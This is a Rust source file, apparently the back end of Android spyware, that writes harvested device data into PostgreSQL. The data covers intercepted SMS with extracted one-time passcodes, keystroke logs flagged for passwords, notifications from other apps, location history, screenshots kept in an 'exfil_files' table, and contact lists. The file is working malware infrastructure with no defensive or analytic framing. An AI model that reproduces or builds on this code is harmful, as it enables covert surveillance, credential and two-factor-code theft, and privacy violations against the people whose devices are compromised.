// [context: Rust, Linux/x64, async DB write layer via sqlx + PostgreSQL]

use sqlx::{PgPool, Row};
use thiserror::Error;
use uuid::Uuid;
use crate::data::ingest::{SmsRecord, NotifRecord, KeylogEntry, LocationPoint, ContactRecord};

#[derive(Error, Debug)]
pub enum StoreError {
    #[error("database error: {0}")]
    Db(#[from] sqlx::Error),
}

pub struct DataStore {
    pool: PgPool,
}

impl DataStore {
    pub fn new(pool: PgPool) -> Self {
        Self { pool }
    }

    pub async fn save_sms(&self, device_id: &str, sms: &SmsRecord) -> Result<(), StoreError> {
        sqlx::query!(
            r#"INSERT INTO sms_messages
               (id, device_id, sender, body, received_at, is_otp, extracted_otp)
               VALUES ($1, $2, $3, $4, to_timestamp($5), $6, $7)"#,
            Uuid::new_v4(),
            Uuid::parse_str(device_id).unwrap_or_default(),
            sms.sender,
            sms.body,
            sms.received_at as f64,
            sms.is_otp,
            sms.extracted_otp.as_deref()
        )
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    pub async fn save_notification(&self, device_id: &str, notif: &NotifRecord) -> Result<(), StoreError> {
        sqlx::query!(
            r#"INSERT INTO notifications
               (id, device_id, package_name, title, body, posted_at)
               VALUES ($1, $2, $3, $4, $5, to_timestamp($6))"#,
            Uuid::new_v4(),
            Uuid::parse_str(device_id).unwrap_or_default(),
            notif.package_name,
            notif.title,
            notif.body,
            notif.posted_at as f64
        )
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    pub async fn save_keylog(&self, device_id: &str, entry: &KeylogEntry) -> Result<(), StoreError> {
        sqlx::query!(
            r#"INSERT INTO keylog_entries
               (id, device_id, app_package, field_type, content, is_password, captured_at)
               VALUES ($1, $2, $3, $4, $5, $6, to_timestamp($7))"#,
            Uuid::new_v4(),
            Uuid::parse_str(device_id).unwrap_or_default(),
            entry.app_package,
            entry.field_type,
            entry.content,
            entry.is_password,
            entry.captured_at as f64
        )
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    pub async fn save_location(&self, device_id: &str, loc: &LocationPoint) -> Result<(), StoreError> {
        sqlx::query!(
            r#"INSERT INTO location_history
               (id, device_id, lat, lng, accuracy, captured_at)
               VALUES ($1, $2, $3, $4, $5, to_timestamp($6))"#,
            Uuid::new_v4(),
            Uuid::parse_str(device_id).unwrap_or_default(),
            loc.lat,
            loc.lng,
            loc.accuracy as f64,
            loc.captured_at as f64
        )
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    pub async fn save_screenshot(
        &self,
        device_id: &str,
        file_path: &str,
        metadata: &serde_json::Value,
    ) -> Result<(), StoreError> {
        sqlx::query!(
            r#"INSERT INTO exfil_files (id, device_id, storage_path, mime_type, original_path)
               VALUES ($1, $2, $3, 'image/jpeg', $4)"#,
            Uuid::new_v4(),
            Uuid::parse_str(device_id).unwrap_or_default(),
            file_path,
            metadata.get("original_path").and_then(|v| v.as_str()).unwrap_or("screenshot")
        )
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    pub async fn save_contact(&self, device_id: &str, contact: &ContactRecord) -> Result<(), StoreError> {
        let phones = serde_json::to_value(&contact.phones).unwrap_or_default();
        let emails = serde_json::to_value(&contact.emails).unwrap_or_default();
        sqlx::query!(
            r#"INSERT INTO contacts (id, device_id, contact_id, name, phones, emails, organization)
               VALUES ($1, $2, $3, $4, $5, $6, $7)
               ON CONFLICT (device_id, contact_id) DO UPDATE
               SET name = EXCLUDED.name, phones = EXCLUDED.phones, emails = EXCLUDED.emails"#,
            Uuid::new_v4(),
            Uuid::parse_str(device_id).unwrap_or_default(),
            contact.contact_id,
            contact.name,
            phones,
            emails,
            contact.organization.as_deref()
        )
        .execute(&self.pool)
        .await?;
        Ok(())
    }
}
